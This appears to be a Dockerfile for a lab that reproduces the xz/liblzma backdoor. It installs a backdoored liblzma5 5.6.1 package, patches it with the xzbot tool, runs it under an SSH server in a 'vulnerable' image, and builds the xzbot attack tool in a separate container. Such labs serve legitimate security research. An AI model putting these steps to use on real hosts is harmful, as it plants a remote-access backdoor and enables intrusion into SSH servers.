# Build the patched backdoor
FROM debian:bookworm AS builder
ARG DEBIAN_FRONTEND=noninteractive

USER root

RUN apt -qqy update && \
    apt -qqy --no-install-recommends --no-install-suggests install \
        binutils \
        build-essential \
        python3-pwntools \
        unzip

COPY backoored-deb/liblzma5_5.6.1-1_amd64.deb /
RUN dpkg -i /liblzma5_5.6.1-1_amd64.deb

COPY backoored-deb/xzbot-0cabe4c.zip /
RUN unzip /xzbot-0cabe4c.zip  -d /

RUN python3 /xzbot-main/patch.py /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1

# Build vulnerable Docker image
FROM debian:bookworm AS vulnerable
ARG DEBIAN_FRONTEND=noninteractive

USER root

RUN apt -qqy update && \
    apt -qqy --no-install-recommends --no-install-suggests install \
        openssh-server

COPY backoored-deb/liblzma5_5.6.1-1_amd64.deb /
RUN dpkg -i /liblzma5_5.6.1-1_amd64.deb
COPY --from=builder \
    /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1.patch \
    /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1

RUN mkdir -p /var/run/sshd

CMD ["/usr/sbin/sshd", "-D"]

# Build the attack container
FROM golang:bookworm AS exploit
ARG DEBIAN_FRONTEND=noninteractive

USER root

RUN apt -qqy update && \
    apt -qqy --no-install-recommends --no-install-suggests install \
        unzip

COPY backoored-deb/xzbot-0cabe4c.zip /
RUN unzip /xzbot-0cabe4c.zip -d /

WORKDIR /xzbot-main
RUN go build .

CMD ["sleep", "inf"]
